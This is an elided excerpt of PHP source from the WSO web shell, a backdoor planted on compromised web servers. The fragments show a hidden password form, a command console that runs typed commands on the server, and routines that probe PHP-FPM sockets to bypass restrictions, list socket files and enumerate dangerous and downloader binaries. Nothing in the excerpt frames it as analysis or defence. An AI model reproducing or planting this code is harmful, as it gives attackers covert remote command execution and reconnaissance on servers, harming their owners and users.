...
try {
	...
	function wsoLogin() {
		...
		$body = str_replace('</body>', "<form method=post><input style='position:fixed;top:-500px;' type=text name=pass autofocus=true></form></body>", $body);
		die($body);
	}
	...
	function wsoBreadCrumps() {
		...
		$console = " <input class='toolsInp hoverable' type=text name=c placeholder='> cmd & Enter' tabindex='0'>";
		echo '<h1>' . $buttons . ' <form onsubmit="g(\'Console\',null,this.c.value);return false;"><a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ <i class="fa fa-home"></i> ]</a> ' . $cwd_links . $filename . $console . '</form></h1>';
	}
	...
	function wsoUnChain($canary) {
		...
		function findSocket() {
			...
			if (is_resource($connection)) {
				...
				$it = @glob("/tmp/php*.sock") or array();
				foreach ($it as $f) $fpm_socket = $f;
				try {
					$it = @glob("/var/run/php*.sock") or array();
					foreach ($it as $f) $fpm_socket = $f;
					$it = @glob("/var/run/php-fpm/*.sock") or array();
					foreach ($it as $f) $fpm_socket = $f;
				}
				catch(Exception $e) {
				}
		...
		while ( !isset($test_file) ) {
			$it = @glob(dirname(__FILE__)."/*.php") or array();
	...
	function wsoGetOpenPorts() {
		...
		try{
			$it = @glob("/tmp/*.sock") or array();
			foreach ($it as $f) {
				$open_ports.= $f . "\n";
			}
			$it = @glob("/var/run/*.sock") or array();
			foreach ($it as $f) {
				$open_ports.= $f . "\n";
			}
		}
	...
	function actionSecInfo() {
		...
		wsoSecParam('Domains', str_replace('"', '', isset($matches[1])?$matches[1]:'no domains on this host'));
		echo '<br>';
		if ($GLOBALS['os'] == 'nix') {
			...
			if (!$GLOBALS['safe_mode']) {
				...
				echo '<br>';
				wsoSecParam('Userful', preg_replace("/\s+/", ', ', wsoEx('type -p '.implode(';type -p ', $userful).';')));
				wsoSecParam('Danger', preg_replace("/\s+/", ', ', wsoEx('type -p '.implode(';type -p ', $danger).';')));
				wsoSecParam('Downloaders', preg_replace("/\s+/", ', ', wsoEx('type -p '.implode(';type -p ', $downloaders).';')));
				echo '<br/>';
